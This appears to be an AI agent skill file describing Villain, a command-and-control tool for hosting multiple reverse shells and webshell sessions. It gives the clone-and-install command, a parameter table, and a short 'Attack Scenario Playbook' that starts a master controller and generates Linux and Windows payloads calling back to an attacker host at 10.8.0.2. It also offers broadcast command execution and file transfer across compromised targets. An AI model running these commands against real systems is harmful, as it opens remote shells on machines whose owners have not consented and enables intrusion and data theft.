---
name: villain-c2-shells
description: "Villain: Multi-session shell hosting. Signals: webshell, RCE, start master, cascade nodes, generate payload."
zh-signals: "Villain: 多会话 shell 托管。信号:webshell,rce,起主控,级联节点,生成 payload。"
when-to-use: >-
  Use when you need to host and manage multiple reverse shells or webshell sessions from a central controller, including cascading nodes and payload generation.
---

# Villain

- Attack Category: C13 Remote Command Execution and WebShell
- Upstream Repository: https://github.com/t3l3machus/Villain
- Upstream License: BSD-2-Clause (manual review required) (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/t3l3machus/Villain && cd Villain && pip install -r requirements.txt
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `./Villain.py -p 4443` | Start master controller |
| `-x 10.8.0.2:4443` | Cascading node |
| `generate os=windows lhost=10.8.0.2` | Generate payload |
| `shell` | Interactive shell |
| `upload/download` | File transfer |
| `exec` | Broadcast execution |

## Attack Scenario Playbook

### Multi-Session Shell Hosting

```bash
./Villain.py -p 4443
Villain > generate os=linux lhost=10.8.0.2
# Sessions automatically call back to the master controller, supporting multi-node cascading and sibling session sharing
```

## Notes

A session-management upgrade by the same author as hoaxshell; centralized management of reverse shells across multiple targets, with encrypted communications.
